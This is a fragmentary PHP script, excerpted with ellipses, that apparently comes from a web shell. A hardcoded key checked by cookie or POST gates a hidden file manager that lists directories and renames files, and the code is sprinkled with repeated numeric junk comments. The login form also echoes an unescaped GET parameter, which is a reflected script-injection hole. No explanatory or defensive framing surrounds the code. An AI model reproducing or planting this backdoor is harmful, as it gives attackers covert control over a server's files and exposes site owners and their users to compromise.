...
$auth_key = "2250d7e93cbaeebece2f1adeb59d8d94";
...
$pass = false;
if (isset($_COOKIE['pw_name_50365'])) {
    if(($_COOKIE['pw_name_50365']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_50365'])) {
        if(($_POST['pw_name_50365']) == $auth_key) {
            setcookie("pw_name_50365", $_POST['pw_name_50365']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_50365' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726395188452032 1726395188717082 1726395188200248 1726395188887697
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726395188452032 1726395188717082 1726395188200248 1726395188887697
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726395188452032 1726395188717082 1726395188200248 1726395188887697
            $name = PATH . "/" . $_GET['r'];
